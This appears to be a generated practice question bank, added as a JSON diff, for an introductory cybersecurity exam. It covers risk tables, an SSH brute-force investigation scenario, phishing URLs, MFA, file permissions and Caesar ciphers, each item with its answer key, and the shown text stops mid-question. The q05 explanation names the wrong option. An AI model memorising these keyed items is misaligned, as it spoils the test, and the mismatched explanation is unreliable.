@@ -1,0 +1,2440 @@
+{
+  "$schema": "../../../schema/questions.schema.json",
+  "stimuli": [
+    {
+      "id": "e08-q18-s",
+      "text": "A risk assessment rates each threat's likelihood and impact from 1 (low) to 5 (high).",
+      "table": {
+        "caption": "Risk assessment",
+        "columns": [
+          {
+            "key": "a",
+            "label": "Asset at risk"
+          },
+          {
+            "key": "l",
+            "label": "Likelihood"
+          },
+          {
+            "key": "i",
+            "label": "Impact"
+          }
+        ],
+        "rows": [
+          {
+            "a": "student records",
+            "l": 2,
+            "i": 2
+          },
+          {
+            "a": "customer database",
+            "l": 1,
+            "i": 1
+          },
+          {
+            "a": "payroll server",
+            "l": 2,
+            "i": 5
+          },
+          {
+            "a": "backup drives",
+            "l": 5,
+            "i": 4
+          }
+        ]
+      }
+    },
+    {
+      "id": "e08-q34-s",
+      "text": "A risk assessment rates each threat's likelihood and impact from 1 (low) to 5 (high).",
+      "table": {
+        "caption": "Risk assessment",
+        "columns": [
+          {
+            "key": "a",
+            "label": "Asset at risk"
+          },
+          {
+            "key": "l",
+            "label": "Likelihood"
+          },
+          {
+            "key": "i",
+            "label": "Impact"
+          }
+        ],
+        "rows": [
+          {
+            "a": "customer database",
+            "l": 4,
+            "i": 5
+          },
+          {
+            "a": "badge system",
+            "l": 2,
+            "i": 3
+          },
+          {
+            "a": "backup drives",
+            "l": 3,
+            "i": 5
+          },
+          {
+            "a": "point-of-sale terminals",
+            "l": 2,
+            "i": 4
+          }
+        ]
+      }
+    },
+    {
+      "id": "e08-q41-s",
+      "text": "A risk assessment rates each threat's likelihood and impact from 1 (low) to 5 (high).",
+      "table": {
+        "caption": "Risk assessment",
+        "columns": [
+          {
+            "key": "a",
+            "label": "Asset at risk"
+          },
+          {
+            "key": "l",
+            "label": "Likelihood"
+          },
+          {
+            "key": "i",
+            "label": "Impact"
+          }
+        ],
+        "rows": [
+          {
+            "a": "customer database",
+            "l": 5,
+            "i": 4
+          },
+          {
+            "a": "badge system",
+            "l": 3,
+            "i": 1
+          },
+          {
+            "a": "student records",
+            "l": 1,
+            "i": 3
+          },
+          {
+            "a": "point-of-sale terminals",
+            "l": 1,
+            "i": 4
+          }
+        ]
+      }
+    },
+    {
+      "id": "e08-frq1-s",
+      "text": "An analyst is investigating the device lab-srv03 after an alert. Use the six sources below.\n\n**Source 1: Security policy**\n\n1. Files containing personal data must not be readable by users outside the owner's group.\n\n2. Remote administration (SSH, port 22) is permitted only from the IT subnet 10.0.15.0/24.\n\n3. Accounts are locked after 5 consecutive failed logins.\n\n4. Only HTTPS (443) may be accepted from outside the organization.\n\n**Source 2: Host firewall rules (inbound, first match)**\n\n```text\n#  Action  Source          Port\n1  ALLOW   any             443\n2  ALLOW   any             22\n3  ALLOW   any             23\n   (all other inbound traffic denied)\n```\n\n**Source 3: File permissions**\n\n```text\n-rw-r--r-- kchen staff  1820 notes.txt\n-rw-r--rw- kchen staff 48211 patients.csv\n-rwxr-x--- kchen staff   902 backup.sh\n```\n\n**Source 4: Authentication log**\n\n```text\n02:13:58 sshd: Accepted publickey for kchen from 10.0.3.21\n02:14:02 sshd: Failed password for admin from 198.51.100.22\n02:14:04 sshd: Failed password for admin from 198.51.100.22\n02:14:06 sshd: Failed password for admin from 198.51.100.22\n02:14:08 sshd: Failed password for admin from 198.51.100.22\n02:14:10 sshd: Failed password for admin from 198.51.100.22\n02:14:12 sshd: Failed password for admin from 198.51.100.22\n02:14:14 sshd: Failed password for admin from 198.51.100.22\n02:14:18 sshd: Accepted password for admin from 198.51.100.22\n02:16:40 sudo: admin : COMMAND=/bin/cat /home/kchen/patients.csv\n```\n\n**Source 5: Active network connections**\n\n```text\nProto  Local        Remote               State\ntcp    lab-srv03:22   198.51.100.22:51544   ESTABLISHED\ntcp    lab-srv03:443  10.0.3.40:60122      ESTABLISHED\n```\n\n**Source 6: Change request**\n\n```text\nProposed: run \"chmod 740 patients.csv\" and replace firewall rule 2 with: ALLOW 10.0.15.0/24 22\n```\n\nOn the real exam, this question also includes six sources about a single device; here they are generated for practice."
+    }
+  ],
+  "questions": [
+    {
+      "id": "e08-q01",
+      "type": "mcq",
+      "topics": [
+        "network-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "A scan shows port 3389 open on a server. Which service most likely uses it?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Telnet",
+          "why": "Telnet uses port 23."
+        },
+        {
+          "id": "b",
+          "text": "SMTP",
+          "why": "SMTP uses port 25."
+        },
+        {
+          "id": "c",
+          "text": "RDP",
+          "why": "Correct. Port 3389 is the standard port for RDP."
+        },
+        {
+          "id": "d",
+          "text": "DNS",
+          "why": "DNS uses port 53."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Port 3389: RDP."
+    },
+    {
+      "id": "e08-q02",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "Malware silently modifies financial reports before they are printed. Which security goal is most directly violated?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Confidentiality",
+          "why": "That would mean: Information is exposed to unauthorized people."
+        },
+        {
+          "id": "b",
+          "text": "Non-repudiation",
+          "why": "Non-repudiation is about proving who performed an action."
+        },
+        {
+          "id": "c",
+          "text": "Availability",
+          "why": "That would mean: Authorized users cannot access the system or data."
+        },
+        {
+          "id": "d",
+          "text": "Integrity",
+          "why": "Correct. Data was altered without authorization."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Data was altered without authorization."
+    },
+    {
+      "id": "e08-q03",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "Ransomware encrypts a city's files and they cannot be used. Which security goal is most directly violated?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Confidentiality",
+          "why": "That would mean: Information is exposed to unauthorized people."
+        },
+        {
+          "id": "b",
+          "text": "Non-repudiation",
+          "why": "Non-repudiation is about proving who performed an action."
+        },
+        {
+          "id": "c",
+          "text": "Availability",
+          "why": "Correct. Authorized users cannot access the system or data."
+        },
+        {
+          "id": "d",
+          "text": "Integrity",
+          "why": "That would mean: Data was altered without authorization."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Authorized users cannot access the system or data."
+    },
+    {
+      "id": "e08-q04",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "A student changes their grade in the gradebook database. Which security goal is most directly violated?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Availability",
+          "why": "That would mean: Authorized users cannot access the system or data."
+        },
+        {
+          "id": "b",
+          "text": "Confidentiality",
+          "why": "That would mean: Information is exposed to unauthorized people."
+        },
+        {
+          "id": "c",
+          "text": "Integrity",
+          "why": "Correct. Data was altered without authorization."
+        },
+        {
+          "id": "d",
+          "text": "Non-repudiation",
+          "why": "Non-repudiation is about proving who performed an action."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Data was altered without authorization."
+    },
+    {
+      "id": "e08-q05",
+      "type": "mcq",
+      "topics": [
+        "suspicious-website-logins"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "A user receives an email that appears to come from Medicore, whose real website is `medicore.com`. Which link most likely leads to a legitimate Medicore login page?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`https://rnedic0re.com/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.com."
+        },
+        {
+          "id": "b",
+          "text": "`https://account-check.net/medicore/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.com."
+        },
+        {
+          "id": "c",
+          "text": "`https://login.medicore.com/account`",
+          "why": "Correct. Its registered domain is medicore.com; \"login\" is a subdomain."
+        },
+        {
+          "id": "d",
+          "text": "`https://medicore.com.account-check.net/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.com."
+        }
+      ],
+      "answer": "c",
+      "explanation": "The registered domain is the part immediately before the first single slash after the host, read from the right. Only the first link is hosted on medicore.com."
+    },
+    {
+      "id": "e08-q06",
+      "type": "mcq",
+      "topics": [
+        "understanding-social-engineering"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "An attacker leaves USB drives labeled 'Salary Info 2027' in a company parking lot, hoping employees will plug them in. What is this attack?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Vishing",
+          "why": "That uses phone calls."
+        },
+        {
+          "id": "b",
+          "text": "Whaling",
+          "why": "That targets executives with tailored phishing."
+        },
+        {
+          "id": "c",
+          "text": "Tailgating",
+          "why": "That is following someone through a door."
+        },
+        {
+          "id": "d",
+          "text": "Baiting",
+          "why": "Correct. It lures victims with something they want."
+        }
+      ],
+      "answer": "d",
+      "explanation": "It lures victims with something they want."
+    },
+    {
+      "id": "e08-q07",
+      "type": "mcq",
+      "topics": [
+        "best-practices-for-public-networks",
+        "ai-based-cybersecurity-attacks",
+        "leveraging-ai-in-cyber-defense"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "At a coffee shop, a traveler sees two open networks named 'CafeWiFi' and 'Cafe WiFi Free'. What is the main risk?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The laptop's battery will drain",
+          "why": "Not a security concern."
+        },
+        {
+          "id": "b",
+          "text": "One may be an evil twin set up by an attacker to intercept traffic",
+          "why": "Correct. Attackers imitate legitimate network names."
+        },
+        {
+          "id": "c",
+          "text": "The networks will be too slow",
+          "why": "Speed is not the security concern."
+        },
+        {
+          "id": "d",
+          "text": "Open networks always contain viruses",
+          "why": "The risk is interception, not automatic infection."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Attackers imitate legitimate network names."
+    },
+    {
+      "id": "e08-q08",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A login requires a smart card and a hardware security key. Is this multifactor authentication?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Yes, because any two credentials count as MFA",
+          "why": "MFA requires different factor types."
+        },
+        {
+          "id": "b",
+          "text": "No, because both factors are of the same type",
+          "why": "Correct. Both are something you have."
+        },
+        {
+          "id": "c",
+          "text": "No, because MFA always requires three factors",
+          "why": "Two different factor types are enough."
+        },
+        {
+          "id": "d",
+          "text": "Yes, because the two factors are of different types",
+          "why": "Classify each factor: know, have or are."
+        }
+      ],
+      "answer": "b",
+      "explanation": "a smart card: something you have; a hardware security key: something you have."
+    },
+    {
+      "id": "e08-q09",
+      "type": "mcq",
+      "topics": [
+        "suspicious-website-logins"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "A user receives an email that appears to come from Medicore, whose real website is `medicore.net`. Which link most likely leads to a legitimate Medicore login page?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`https://login.medicore.net/account`",
+          "why": "Correct. Its registered domain is medicore.net; \"login\" is a subdomain."
+        },
+        {
+          "id": "b",
+          "text": "`https://rnedic0re.net/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.net."
+        },
+        {
+          "id": "c",
+          "text": "`https://medicore.net.login-help.co/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.net."
+        },
+        {
+          "id": "d",
+          "text": "`https://login-help.co/medicore/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not medicore.net."
+        }
+      ],
+      "answer": "a",
+      "explanation": "The registered domain is the part immediately before the first single slash after the host, read from the right. Only the first link is hosted on medicore.net."
+    },
+    {
+      "id": "e08-q10",
+      "type": "mcq",
+      "topics": [
+        "asymmetric-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Jada wants to digitally sign a document so anyone can verify it came from Jada. Which key does Jada use to sign?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Jada's private key",
+          "why": "Correct. Only Jada holds the private key; anyone can verify with the public key."
+        },
+        {
+          "id": "b",
+          "text": "Dara's public key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "c",
+          "text": "Dara's private key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "d",
+          "text": "Jada's public key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        }
+      ],
+      "answer": "a",
+      "explanation": "Confidentiality: encrypt with the recipient's public key. Signing: sign with the sender's private key; verify with the sender's public key."
+    },
+    {
+      "id": "e08-q11",
+      "type": "mcq",
+      "topics": [
+        "understanding-social-engineering"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "Which control most directly reduces the success of phishing attacks against employees?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Disabling all firewalls",
+          "why": "That would weaken security."
+        },
+        {
+          "id": "b",
+          "text": "Installing more door locks",
+          "why": "That addresses physical access."
+        },
+        {
+          "id": "c",
+          "text": "Regular security awareness training with simulated phishing exercises",
+          "why": "Correct. It teaches people to recognize and report phishing."
+        },
+        {
+          "id": "d",
+          "text": "Increasing network bandwidth",
+          "why": "That does not affect phishing."
+        }
+      ],
+      "answer": "c",
+      "explanation": "It teaches people to recognize and report phishing."
+    },
+    {
+      "id": "e08-q12",
+      "type": "mcq",
+      "topics": [
+        "protecting-stored-data-with-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "The ciphertext `EKRJGT` was produced by a Caesar cipher with a shift of 2 (A → C). What is the plaintext?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`REHPIC`",
+          "why": "A Caesar cipher substitutes letters; it does not reorder them."
+        },
+        {
+          "id": "b",
+          "text": "`BHOGDQ`",
+          "why": "The shift is 2, not 3."
+        },
+        {
+          "id": "c",
+          "text": "`CIPHER`",
+          "why": "Correct. Shift each letter back by 2."
+        },
+        {
+          "id": "d",
+          "text": "`GMTLIV`",
+          "why": "Check the direction of the shift."
+        }
+      ],
+      "answer": "c",
+      "explanation": "EKRJGT ← CIPHER with shift 2."
+    },
+    {
+      "id": "e08-q13",
+      "type": "mcq",
+      "topics": [
+        "network-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "A scan shows port 443 open on a server. Which service most likely uses it?",
+      "options": [
+        {
+          "id": "a",
+          "text": "RDP",
+          "why": "RDP uses port 3389."
+        },
+        {
+          "id": "b",
+          "text": "HTTP",
+          "why": "HTTP uses port 80."
+        },
+        {
+          "id": "c",
+          "text": "SSH",
+          "why": "SSH uses port 22."
+        },
+        {
+          "id": "d",
+          "text": "HTTPS",
+          "why": "Correct. Port 443 is the standard port for HTTPS."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Port 443: HTTPS."
+    },
+    {
+      "id": "e08-q14",
+      "type": "mcq",
+      "topics": [
+        "asymmetric-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Ana receives a document digitally signed by Ivan. Which key does Ana use to verify the signature?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Ana's private key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "b",
+          "text": "Ana's public key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "c",
+          "text": "Ivan's private key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "d",
+          "text": "Ivan's public key",
+          "why": "Correct. Signatures made with Ivan's private key are verified with Ivan's public key."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Confidentiality: encrypt with the recipient's public key. Signing: sign with the sender's private key; verify with the sender's public key."
+    },
+    {
+      "id": "e08-q15",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-managerial-controls-and-wireless-security",
+        "protecting-networks-segmentation",
+        "network-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Where should a company place its public web server?",
+      "options": [
+        {
+          "id": "a",
+          "text": "In a DMZ separated from the internal network by firewalls",
+          "why": "Correct. It isolates internet-facing systems."
+        },
+        {
+          "id": "b",
+          "text": "On the same network segment as the payroll database",
+          "why": "A compromise would expose payroll."
+        },
+        {
+          "id": "c",
+          "text": "On an employee's laptop",
+          "why": "Laptops are not secure servers."
+        },
+        {
+          "id": "d",
+          "text": "Outside any firewall with all ports open",
+          "why": "That maximizes exposure."
+        }
+      ],
+      "answer": "a",
+      "explanation": "It isolates internet-facing systems."
+    },
+    {
+      "id": "e08-q16",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A login requires a code from an authenticator app on a phone and a password. Is this multifactor authentication?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Yes, because the two factors are of different types",
+          "why": "Correct. One is something you have, the other something you know."
+        },
+        {
+          "id": "b",
+          "text": "No, because both factors are of the same type",
+          "why": "Classify each factor: know, have or are."
+        },
+        {
+          "id": "c",
+          "text": "No, because MFA always requires three factors",
+          "why": "Two different factor types are enough."
+        },
+        {
+          "id": "d",
+          "text": "Yes, because any two credentials count as MFA",
+          "why": "MFA requires different factor types."
+        }
+      ],
+      "answer": "a",
+      "explanation": "a code from an authenticator app on a phone: something you have; a password: something you know."
+    },
+    {
+      "id": "e08-q17",
+      "type": "mcq",
+      "topics": [
+        "understanding-social-engineering"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "A text message says a package could not be delivered and asks the recipient to pay a small fee through a link. What is this?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Shoulder surfing",
+          "why": "That is watching someone's screen."
+        },
+        {
+          "id": "b",
+          "text": "Tailgating",
+          "why": "That is a physical attack."
+        },
+        {
+          "id": "c",
+          "text": "Pretexting in person",
+          "why": "This is a text message."
+        },
+        {
+          "id": "d",
+          "text": "Smishing",
+          "why": "Correct. Phishing by SMS text message."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Phishing by SMS text message."
+    },
+    {
+      "id": "e08-q18",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stimuli": [
+        "e08-q18-s"
+      ],
+      "stem": "Using risk = likelihood × impact, which risk should be addressed first?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The backup drives (risk 20)",
+          "why": "Correct. It has the largest product of likelihood and impact."
+        },
+        {
+          "id": "b",
+          "text": "The payroll server (risk 10)",
+          "why": "Highest impact alone does not make it the highest risk."
+        },
+        {
+          "id": "c",
+          "text": "The customer database (risk 1)",
+          "why": "Its likelihood × impact is lower."
+        },
+        {
+          "id": "d",
+          "text": "The student records (risk 4)",
+          "why": "Its likelihood × impact is lower."
+        }
+      ],
+      "answer": "a",
+      "explanation": "Risk scores: student records 4, customer database 1, payroll server 10, backup drives 20."
+    },
+    {
+      "id": "e08-q19",
+      "type": "mcq",
+      "topics": [
+        "device-vulnerabilities-and-attacks",
+        "protecting-devices"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "Ransomware encrypts a company's files. Which preparation allows recovery without paying?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Paying the ransom quickly",
+          "why": "Payment is not guaranteed to work and funds criminals."
+        },
+        {
+          "id": "b",
+          "text": "A stronger Wi-Fi password",
+          "why": "That does not restore files."
+        },
+        {
+          "id": "c",
+          "text": "Rebooting the computers",
+          "why": "Encrypted files stay encrypted."
+        },
+        {
+          "id": "d",
+          "text": "Recent, offline backups that are tested regularly",
+          "why": "Correct. Clean backups restore the data."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Clean backups restore the data."
+    },
+    {
+      "id": "e08-q20",
+      "type": "mcq",
+      "topics": [
+        "network-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 1,
+      "stem": "A scan shows port 25 open on a server. Which service most likely uses it?",
+      "options": [
+        {
+          "id": "a",
+          "text": "DNS",
+          "why": "DNS uses port 53."
+        },
+        {
+          "id": "b",
+          "text": "SMTP",
+          "why": "Correct. Port 25 is the standard port for SMTP."
+        },
+        {
+          "id": "c",
+          "text": "Telnet",
+          "why": "Telnet uses port 23."
+        },
+        {
+          "id": "d",
+          "text": "SSH",
+          "why": "SSH uses port 22."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Port 25: SMTP."
+    },
+    {
+      "id": "e08-q21",
+      "type": "mcq",
+      "topics": [
+        "physical-vulnerabilities-and-attacks",
+        "protecting-physical-spaces"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Visitors in a lobby can see an employee typing passwords at the reception computer. What vulnerability is this, and what is a fix?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Dumpster diving; shred documents",
+          "why": "Nothing is being thrown away."
+        },
+        {
+          "id": "b",
+          "text": "DDoS; add bandwidth",
+          "why": "That affects networks."
+        },
+        {
+          "id": "c",
+          "text": "Shoulder surfing; reposition the screen or use a privacy filter",
+          "why": "Correct. Watching screens and keyboards reveals secrets."
+        },
+        {
+          "id": "d",
+          "text": "Phishing; filter email",
+          "why": "No messages are involved."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Watching screens and keyboards reveals secrets."
+    },
+    {
+      "id": "e08-q22",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A login requires a hardware security key and a password. Is this multifactor authentication?",
+      "options": [
+        {
+          "id": "a",
+          "text": "No, because MFA always requires three factors",
+          "why": "Two different factor types are enough."
+        },
+        {
+          "id": "b",
+          "text": "Yes, because the two factors are of different types",
+          "why": "Correct. One is something you have, the other something you know."
+        },
+        {
+          "id": "c",
+          "text": "Yes, because any two credentials count as MFA",
+          "why": "MFA requires different factor types."
+        },
+        {
+          "id": "d",
+          "text": "No, because both factors are of the same type",
+          "why": "Classify each factor: know, have or are."
+        }
+      ],
+      "answer": "b",
+      "explanation": "a hardware security key: something you have; a password: something you know."
+    },
+    {
+      "id": "e08-q23",
+      "type": "mcq",
+      "topics": [
+        "best-practices-for-public-networks",
+        "ai-based-cybersecurity-attacks",
+        "leveraging-ai-in-cyber-defense"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Which practice best protects data sent over public Wi-Fi?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Using a VPN to encrypt all traffic",
+          "why": "Correct. A VPN creates an encrypted tunnel to a trusted server."
+        },
+        {
+          "id": "b",
+          "text": "Enabling file sharing",
+          "why": "That increases exposure."
+        },
+        {
+          "id": "c",
+          "text": "Connecting to the network with the strongest signal",
+          "why": "An evil twin may have the strongest signal."
+        },
+        {
+          "id": "d",
+          "text": "Turning up screen brightness",
+          "why": "Unrelated."
+        }
+      ],
+      "answer": "a",
+      "explanation": "A VPN creates an encrypted tunnel to a trusted server."
+    },
+    {
+      "id": "e08-q24",
+      "type": "mcq",
+      "topics": [
+        "protecting-applications-and-data-managerial-controls-and-access-controls",
+        "protecting-stored-data-with-cryptography",
+        "protecting-applications"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A company stores user passwords. How should they be stored?",
+      "options": [
+        {
+          "id": "a",
+          "text": "As Base64-encoded text",
+          "why": "Encoding is not encryption."
+        },
+        {
+          "id": "b",
+          "text": "As salted hashes using a slow password-hashing algorithm",
+          "why": "Correct. Hashes cannot be reversed, and salts defeat precomputed tables."
+        },
+        {
+          "id": "c",
+          "text": "Encrypted with a key stored on the same server",
+          "why": "An attacker who gets the server gets the key."
+        },
+        {
+          "id": "d",
+          "text": "In plain text in a protected file",
+          "why": "A breach would expose every password."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Hashes cannot be reversed, and salts defeat precomputed tables."
+    },
+    {
+      "id": "e08-q25",
+      "type": "mcq",
+      "topics": [
+        "understanding-social-engineering"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "An email addressed to a company's CFO by name references a real upcoming acquisition and asks for an urgent wire transfer. What is this attack?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Smishing",
+          "why": "That uses text messages."
+        },
+        {
+          "id": "b",
+          "text": "Whaling (spear phishing aimed at an executive)",
+          "why": "Correct. It is targeted, personalized and aimed at a senior executive."
+        },
+        {
+          "id": "c",
+          "text": "A denial-of-service attack",
+          "why": "That targets availability, not a person."
+        },
+        {
+          "id": "d",
+          "text": "Baiting",
+          "why": "Baiting uses lures like free downloads or USB drives."
+        }
+      ],
+      "answer": "b",
+      "explanation": "It is targeted, personalized and aimed at a senior executive."
+    },
+    {
+      "id": "e08-q26",
+      "type": "mcq",
+      "topics": [
+        "protecting-devices"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "After running `chmod 764 backup.sh`, what permissions does `backup.sh` have?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`-rwxrw-r--`",
+          "why": "Correct. Each digit is the sum of r = 4, w = 2, x = 1 for owner, group and others."
+        },
+        {
+          "id": "b",
+          "text": "`-r-xrw-r--`",
+          "why": "Recheck the write bit (2)."
+        },
+        {
+          "id": "c",
+          "text": "`-rwxrwxrwx`",
+          "why": "Each digit applies to a different class."
+        },
+        {
+          "id": "d",
+          "text": "`-r--rw-rwx`",
+          "why": "The first digit is the owner."
+        }
+      ],
+      "answer": "a",
+      "explanation": "7 = rwx, 6 = rw-, 4 = r--."
+    },
+    {
+      "id": "e08-q27",
+      "type": "mcq",
+      "topics": [
+        "device-vulnerabilities-and-attacks",
+        "protecting-devices"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "Malware spreads automatically from computer to computer across a network without any user action. What type is it?",
+      "options": [
+        {
+          "id": "a",
+          "text": "A virus that needs a user to run an infected file",
+          "why": "That describes a virus, which needs user action."
+        },
+        {
+          "id": "b",
+          "text": "A trojan",
+          "why": "Trojans rely on users installing them."
+        },
+        {
+          "id": "c",
+          "text": "A worm",
+          "why": "Correct. Worms self-propagate."
+        },
+        {
+          "id": "d",
+          "text": "Adware",
+          "why": "Adware displays ads."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Worms self-propagate."
+    },
+    {
+      "id": "e08-q28",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations",
+        "protecting-physical-spaces"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "How is a sign warning that the area is under video surveillance best classified, by control category and function?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Physical, corrective",
+          "why": "Consider both what kind of control it is and what it does."
+        },
+        {
+          "id": "b",
+          "text": "Physical, detective",
+          "why": "Consider both what kind of control it is and what it does."
+        },
+        {
+          "id": "c",
+          "text": "Physical, deterrent",
+          "why": "Correct. It is a physical control whose purpose is to discourage attackers."
+        },
+        {
+          "id": "d",
+          "text": "Managerial, deterrent",
+          "why": "Consider both what kind of control it is and what it does."
+        }
+      ],
+      "answer": "c",
+      "explanation": "A sign warning that the area is under video surveillance: physical, deterrent control."
+    },
+    {
+      "id": "e08-q29",
+      "type": "mcq",
+      "topics": [
+        "protecting-devices"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "After running `chmod 550 config.ini`, what permissions does `config.ini` have?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`-rwxr-x---`",
+          "why": "Recheck the write bit (2)."
+        },
+        {
+          "id": "b",
+          "text": "`-r-xr-x---`",
+          "why": "Correct. Each digit is the sum of r = 4, w = 2, x = 1 for owner, group and others."
+        },
+        {
+          "id": "c",
+          "text": "`----r-xr-x`",
+          "why": "The first digit is the owner."
+        },
+        {
+          "id": "d",
+          "text": "`-r-xr-xr-x`",
+          "why": "Each digit applies to a different class."
+        }
+      ],
+      "answer": "b",
+      "explanation": "5 = r-x, 5 = r-x, 0 = ---."
+    },
+    {
+      "id": "e08-q30",
+      "type": "mcq",
+      "topics": [
+        "protecting-stored-data-with-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "The ciphertext `GFHPZU` was produced by a Caesar cipher with a shift of 5 (A → F). What is the plaintext?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`PUKCAB`",
+          "why": "A Caesar cipher substitutes letters; it does not reorder them."
+        },
+        {
+          "id": "b",
+          "text": "`AZBJTO`",
+          "why": "The shift is 5, not 6."
+        },
+        {
+          "id": "c",
+          "text": "`LKMUEZ`",
+          "why": "Check the direction of the shift."
+        },
+        {
+          "id": "d",
+          "text": "`BACKUP`",
+          "why": "Correct. Shift each letter back by 5."
+        }
+      ],
+      "answer": "d",
+      "explanation": "GFHPZU ← BACKUP with shift 5."
+    },
+    {
+      "id": "e08-q31",
+      "type": "mcq",
+      "topics": [
+        "protecting-stored-data-with-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "The ciphertext `CVVCEM` was produced by a Caesar cipher with a shift of 2 (A → C). What is the plaintext?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`ATTACK`",
+          "why": "Correct. Shift each letter back by 2."
+        },
+        {
+          "id": "b",
+          "text": "`ZSSZBJ`",
+          "why": "The shift is 2, not 3."
+        },
+        {
+          "id": "c",
+          "text": "`EXXEGO`",
+          "why": "Check the direction of the shift."
+        },
+        {
+          "id": "d",
+          "text": "`KCATTA`",
